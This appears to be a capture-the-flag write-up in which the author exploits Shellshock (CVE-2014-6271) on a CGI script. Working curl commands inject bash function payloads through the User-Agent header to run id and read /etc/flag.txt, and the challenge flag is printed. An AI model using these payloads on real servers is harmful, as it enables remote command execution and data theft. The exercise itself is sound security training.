# Blast From The Past

## Description

You have been tasked with auditing a legacy system at DDA. This system is said to be so old, it has not been updated since 2014! It is said that it is vulnerable to a very famous vulnerability... Can you exploit it and read the flag at /etc/flag.txt?

## Solution

![Blast From The Past.png](/assets/ctf/idex.ctf.ae/blast-from-the-past.png)

Website is not showing any routes that go to other pages.

So the only information we have is Apache version 2.4.7; After too much research CVE's led to Shellshock ([CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271))

Checking for common files we get `/cgi-bin/test.cgi`

```bash
└─$ curl https://68c3806105fa242443e6b4fe782683ca.chal.ctf.ae/cgi-bin/test.cgi
Hello, World!
Environment:
SERVER_SIGNATURE=<address>Apache/2.4.7 (Ubuntu) Server at 68c3806105fa242443e6b4fe782683ca.chal.ctf.ae Port 80</address>

HTTP_USER_AGENT=curl/8.8.0
SERVER_PORT=80
HTTP_HOST=68c3806105fa242443e6b4fe782683ca.chal.ctf.ae
DOCUMENT_ROOT=/var/www/html
SCRIPT_FILENAME=/usr/lib/cgi-bin/test.cgi
REQUEST_URI=/cgi-bin/test.cgi
SCRIPT_NAME=/cgi-bin/test.cgi
REMOTE_PORT=34342
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CONTEXT_PREFIX=/cgi-bin/
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
REQUEST_SCHEME=http
HTTP_ACCEPT=*/*
REMOTE_ADDR=10.250.250.38
SHLVL=1
SERVER_NAME=68c3806105fa242443e6b4fe782683ca.chal.ctf.ae
SERVER_SOFTWARE=Apache/2.4.7 (Ubuntu)
QUERY_STRING=
SERVER_ADDR=10.200.106.64
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
_=/usr/bin/env
```

```bash
└─$ curl -H "User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" https://68c3806105fa242443e6b4fe782683ca.chal.ctf.ae/cgi-bin/test.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl -H "User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /bin/cat /etc/flag.txt" https://68c3806105fa242443e6b4fe782683ca.chal.ctf.ae/cgi-bin/test.cgi

flag{EUU3ItYVjy6FiIjhMdkgT4SKKyjNmSPx}
```

> Flag: `flag{EUU3ItYVjy6FiIjhMdkgT4SKKyjNmSPx}`

